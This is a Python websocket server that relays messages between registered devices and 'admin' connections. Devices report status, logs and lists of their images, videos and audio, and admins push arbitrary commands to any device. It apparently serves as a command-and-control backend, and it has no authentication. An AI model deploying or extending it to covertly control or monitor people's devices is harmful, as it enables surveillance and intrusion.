import asyncio
import json
import os
import time
import websockets

clients = {}
admins = {}


async def broadcast_admins(msg: dict):
    data = json.dumps(msg)
    for group in list(admins.values()):
        for ws in list(group):
            try:
                await ws.send(data)
            except Exception:
                pass


async def handler(ws):
    role = None
    device_id = None
    admin_id = None
    try:
        async for raw in ws:
            try:
                msg = json.loads(raw)
            except Exception:
                continue
            t = msg.get("type")

            if t == "register_client":
                role = "client"
                device_id = msg.get("deviceId", "unknown")
                clients[device_id] = ws
                print(f"[+] client online: {device_id}")
                await broadcast_admins({"type": "client_online", "deviceId": device_id})
                await ws.send(json.dumps({"type": "welcome", "deviceId": device_id}))

            elif t == "register_admin":
                role = "admin"
                admin_id = msg.get("deviceId", "admin")
                admins.setdefault(admin_id, set()).add(ws)
                print(f"[+] admin online: {admin_id}")
                await ws.send(json.dumps({
                    "type": "devices",
                    "devices": [
                        {"id": did, "online": True, "lastSeen": int(time.time() * 1000)}
                        for did in clients.keys()
                    ]
                }))

            elif t == "status":
                await broadcast_admins({"type": "status", "deviceId": device_id, **msg})

            elif t == "log":
                await broadcast_admins({
                    "type": "log",
                    "deviceId": device_id,
                    "message": msg.get("message", ""),
                    "ts": int(time.time() * 1000)
                })

            elif t == "media_list":
                await broadcast_admins({
                    "type": "media_list",
                    "deviceId": device_id,
                    "images": msg.get("images", []),
                    "videos": msg.get("videos", []),
                    "audio": msg.get("audio", [])
                })

            elif t == "command":
                target = msg.get("deviceId")
                cmd = msg.get("cmd")
                payload = msg.get("payload", {})
                print(f"[cmd] {target} <- {cmd}")
                if target in clients:
                    try:
                        await clients[target].send(json.dumps({
                            "type": "command",
                            "cmd": cmd,
                            "payload": payload,
                            "ts": int(time.time() * 1000)
                        }))
                        await ws.send(json.dumps({"type": "ack", "deviceId": target, "ok": True}))
                    except Exception as e:
                        await ws.send(json.dumps({"type": "ack", "deviceId": target, "ok": False, "error": str(e)}))
                else:
                    await ws.send(json.dumps({"type": "ack", "deviceId": target, "ok": False, "error": "offline"}))

    finally:
        if role == "client" and device_id:
            clients.pop(device_id, None)
            print(f"[-] client offline: {device_id}")
            await broadcast_admins({"type": "client_offline", "deviceId": device_id})
        elif role == "admin" and admin_id:
            admins.get(admin_id, set()).discard(ws)


async def main():
    port = int(os.environ.get("PORT", 10000))
    async with websockets.serve(handler, "0.0.0.0", port):
        print(f"Server started on :{port}")
        await asyncio.Future()


if __name__ == "__main__":
    asyncio.run(main())
